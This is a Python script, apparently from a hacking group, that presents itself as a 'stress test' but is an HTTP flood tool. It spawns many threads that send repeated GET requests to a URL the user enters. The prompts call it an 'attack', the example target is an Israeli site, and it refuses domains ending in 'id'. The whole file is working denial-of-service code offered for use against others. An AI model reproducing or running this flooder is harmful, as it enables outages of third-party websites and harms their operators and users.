import requests
import time
import sys
import threading
import os
from colorama import Fore, Style, init
init()

def stress_test(url):
    num_threads = int(input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mRequests/second \033[1;31m(ex. 100) \033[1;36m: \033[0;37m"))
    requests_per_second = int(input(" \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mThreads \033[1;31m(ex. 100) \033[1;36m: \033[0;37m"))
    def send_requests():
        requests_sent = 0
        session = requests.Session()
        try:
            while not stop_event.is_set():
                session.get(url)
                requests_sent += 1
                print(f" \033[1;34mThread-{threading.current_thread().ident} Request {requests_sent} Berhasil" + Style.RESET_ALL)
                time.sleep(1 / requests_per_second)
        except Exception as e:
            print(f" \033[1;31mThread-{threading.current_thread().ident} encountered an error: {e}")
    stop_event = threading.Event()
    threads = []
    for _ in range(num_threads):
        thread = threading.Thread(target=send_requests)
        thread.start()
        threads.append(thread)
    try:
        print("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mPress Ctr+Z to stop the attack\n")
        #Check result on https://check-host.net/check-http?host={url}\n")
    except KeyboardInterrupt:
        print(" \033[1;31mExiting...")
        stop_event.set()
    for thread in threads:
        thread.join()
if __name__ == "__main__":
    #print("\n\033[1;34m                CODED BY SHADOW XPLOIT")
    #print("\n\033[1;34m             POWERED BY DARK XPLOITER OFC")
    url = input("\n \033[1;31m[\033[1;37m+\033[1;31m] \033[1;34mURL \033[1;31m(ex. https://en.cis.org.il) \033[1;36m: \033[0;37m")
    if url.endswith("id"):
       time.sleep(1)
       print("\n \033[1;31m[\033[1;37m-\033[1;31m] \033[1;34mAkses ditolak!!!\n")
       time.sleep(0.5)
       sys.exit()
    else:
       stress_test(url)